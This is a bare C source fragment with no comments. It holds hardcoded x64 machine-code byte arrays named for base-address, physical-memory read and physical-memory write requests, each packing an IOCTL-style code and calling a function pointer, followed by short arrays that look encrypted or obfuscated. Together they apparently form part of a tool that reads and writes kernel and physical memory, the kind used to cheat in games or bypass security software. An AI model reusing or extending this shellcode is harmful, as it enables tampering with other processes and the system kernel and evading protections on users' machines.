

unsigned char _BaseAddyRequest[86] = {
	0x4C, 0x8B, 0xDC, 0x57, 0x48, 0x83, 0xEC, 0x60, 0x45, 0x33, 0xD2, 0x49,
	0x8D, 0x7B, 0xB8, 0x44, 0x8B, 0xC9, 0x45, 0x89, 0x53, 0xC4, 0x0F, 0x57,
	0xC0, 0x33, 0xC0, 0xF3, 0x0F, 0x7F, 0x44, 0x24, 0x38, 0x4D, 0x89, 0x53,
	0xE0, 0xB9, 0x38, 0x00, 0x00, 0x00, 0xF3, 0xAA, 0x45, 0x89, 0x53, 0xB8,
	0x49, 0x8D, 0x4B, 0xB8, 0xC7, 0x44, 0x24, 0x28, 0x72, 0x13, 0x00, 0x00,
	0x45, 0x89, 0x4B, 0xBC, 0x49, 0x89, 0x53, 0xE8, 0x4D, 0x89, 0x53, 0xC8,
	0x41, 0xFF, 0xD0, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x60,
	0x5F, 0xC3
};

unsigned char _PhysicalReadRequest[88] = {
	0x4C, 0x8B, 0xDC, 0x57, 0x48, 0x83, 0xEC, 0x60, 0x33, 0xC0, 0x49, 0x8D,
	0x7B, 0xB8, 0x49, 0x89, 0x43, 0xC4, 0x44, 0x8B, 0xD1, 0x89, 0x44, 0x24,
	0x34, 0xB9, 0x38, 0x00, 0x00, 0x00, 0x49, 0x89, 0x43, 0xE8, 0xF3, 0xAA,
	0xC7, 0x44, 0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8D, 0x4B, 0xB8,
	0xC7, 0x44, 0x24, 0x28, 0x72, 0x13, 0x00, 0x00, 0x41, 0x8B, 0xC1, 0x49,
	0x89, 0x43, 0xE0, 0x45, 0x89, 0x53, 0xBC, 0x49, 0x89, 0x53, 0xD0, 0x4D,
	0x89, 0x43, 0xD8, 0xFF, 0x94, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x83,
	0xC4, 0x60, 0x5F, 0xC3
};


unsigned char _PhysicalWriteRequest[88] = {
	0x4C, 0x8B, 0xDC, 0x57, 0x48, 0x83, 0xEC, 0x60, 0x33, 0xC0, 0x49, 0x8D,
	0x7B, 0xB8, 0x49, 0x89, 0x43, 0xC4, 0x44, 0x8B, 0xD1, 0x89, 0x44, 0x24,
	0x34, 0xB9, 0x38, 0x00, 0x00, 0x00, 0x49, 0x89, 0x43, 0xE8, 0xF3, 0xAA,
	0xC7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00, 0x49, 0x8D, 0x4B, 0xB8,
	0xC7, 0x44, 0x24, 0x28, 0x72, 0x13, 0x00, 0x00, 0x41, 0x8B, 0xC1, 0x49,
	0x89, 0x43, 0xE0, 0x45, 0x89, 0x53, 0xBC, 0x49, 0x89, 0x53, 0xD0, 0x4D,
	0x89, 0x43, 0xD8, 0xFF, 0x94, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x83,
	0xC4, 0x60, 0x5F, 0xC3
};


unsigned char dll[] =
{

	0x1c, 0x5d, 0x96, 0xdc, 0xdb, 0x18, 0x5f, 0xd7,
	0x1f, 0x5e, 0x7a
};

unsigned char userInit[] =
{

	0x49, 0x6e, 0x20, 0x5a, 0xf0, 0x2f, 0xac, 0x7e,
	0xec, 0xee, 0x15
};

unsigned char function[] =
{

	0x44, 0x89, 0x48, 0x89, 0x62, 0x79, 0x38, 0x65,
	0x68, 0x19, 0x5a, 0x59, 0x3e, 0x4b, 0x58, 0x59,
	0xb0, 0x73, 0x38, 0x39, 0x52, 0x4f, 0x32, 0x55,
	0xf6, 0x51, 0xe8, 0x29, 0x4a, 0x55, 0x2c, 0x27,
	0x52, 0x9b, 0xdc, 0xe3, 0x82, 0xf4
};